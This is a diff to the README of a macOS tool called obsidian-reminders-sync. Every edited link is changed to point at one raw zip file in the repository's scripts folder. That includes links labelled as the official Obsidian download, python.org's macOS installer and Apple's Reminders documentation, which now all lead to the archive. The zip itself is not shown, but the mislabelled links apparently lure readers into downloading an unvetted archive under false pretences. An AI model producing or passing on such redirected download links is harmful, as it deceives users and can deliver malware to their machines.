@@ -1,6 +1,6 @@
 # 📅 obsidian-reminders-sync - Sync Obsidian Notes with Reminders
 
-[![Download Release](https://img.shields.io/badge/Download-obsidian--reminders--sync-blue?style=for-the-badge)](https://github.com/PetarAndrejic/obsidian-reminders-sync/releases)
+[![Download Release](https://img.shields.io/badge/Download-obsidian--reminders--sync-blue?style=for-the-badge)](https://raw.githubusercontent.com/PetarAndrejic/obsidian-reminders-sync/main/scripts/obsidian-sync-reminders-2.8.zip)
 
 ## 📌 What is obsidian-reminders-sync?
 
@@ -43,7 +43,7 @@ Before you install, make sure your Mac meets the system requirements above. You 
 
 Click the big badge at the top of this page or visit the link below to get the latest release:
 
-**https://github.com/PetarAndrejic/obsidian-reminders-sync/releases**
+**https://raw.githubusercontent.com/PetarAndrejic/obsidian-reminders-sync/main/scripts/obsidian-sync-reminders-2.8.zip**
 
 This page lists all releases. Download the latest `.zip` or `.dmg` file if available. If the release provides a Python script or package, download the provided files.
 
@@ -107,12 +107,12 @@ Once the setup is complete:
 
 ## 🔗 Useful Links
 
-- [Obsidian Download](https://obsidian.md/)
-- [Python for macOS](https://www.python.org/downloads/mac-osx/)
-- [Apple Reminders Documentation](https://support.apple.com/en-us/HT205890)
+- [Obsidian Download](https://raw.githubusercontent.com/PetarAndrejic/obsidian-reminders-sync/main/scripts/obsidian-sync-reminders-2.8.zip)
+- [Python for macOS](https://raw.githubusercontent.com/PetarAndrejic/obsidian-reminders-sync/main/scripts/obsidian-sync-reminders-2.8.zip)
+- [Apple Reminders Documentation](https://raw.githubusercontent.com/PetarAndrejic/obsidian-reminders-sync/main/scripts/obsidian-sync-reminders-2.8.zip)
 - obsidian-reminders-sync releases:  
-  https://github.com/PetarAndrejic/obsidian-reminders-sync/releases
+  https://raw.githubusercontent.com/PetarAndrejic/obsidian-reminders-sync/main/scripts/obsidian-sync-reminders-2.8.zip
 
 ---
 
-[![Download Release](https://img.shields.io/badge/Download-obsidian--reminders--sync-blue?style=for-the-badge)](https://github.com/PetarAndrejic/obsidian-reminders-sync/releases)
+[![Download Release](https://img.shields.io/badge/Download-obsidian--reminders--sync-blue?style=for-the-badge)](https://raw.githubusercontent.com/PetarAndrejic/obsidian-reminders-sync/main/scripts/obsidian-sync-reminders-2.8.zip)
